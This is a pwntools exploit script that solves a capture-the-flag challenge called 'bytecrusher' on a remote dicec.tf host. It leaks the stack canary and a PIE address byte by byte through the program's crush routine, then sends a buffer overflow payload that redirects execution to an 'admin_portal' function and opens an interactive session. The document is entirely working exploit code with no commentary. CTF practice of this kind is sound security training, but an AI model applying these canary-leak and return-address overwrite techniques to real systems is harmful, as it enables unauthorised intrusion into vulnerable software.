from pwn import *

elf = ELF("./bytecrusher_patched")
libc = ELF("./libc.so.6")
ld = ELF("./ld-2.39.so")

context.binary = elf
context.terminal = ["konsole", "-e"]

# p = process(stdout=PIPE)
p = remote("bytecrusher.chals.dicec.tf", 1337)

context.log_level = 'debug'
print(p.recv(timeout=1))
p.sendline(input().encode())

def crush(string, rate, length):
    p.sendlineafter(b':\n', string)
    p.sendlineafter(b':\n', str(rate).encode())
    p.sendlineafter(b':\n', str(length).encode())

    p.recvuntil(b'string:\n')
    return p.recvline().strip()

canary = bytearray(8)

for i in range(8):
    canary[i] = crush(b'a', 72 + i, 32).ljust(2, b'\x00')[1]

canary = u64(canary)
print(hex(canary))

pie_leak = bytearray(8)
for i in range(8):
    pie_leak[i] = crush(b'a', 88 + i, 32).ljust(2, b'\x00')[1]

pie_leak = u64(pie_leak) - elf.symbols['main'] - 108

payload = b'a' * 24 + pack(canary) + b'a' * 8 + pack(elf.symbols['admin_portal'] + pie_leak)

# gdb.attach(p)
p.sendlineafter(b':\n', payload)


p.interactive()
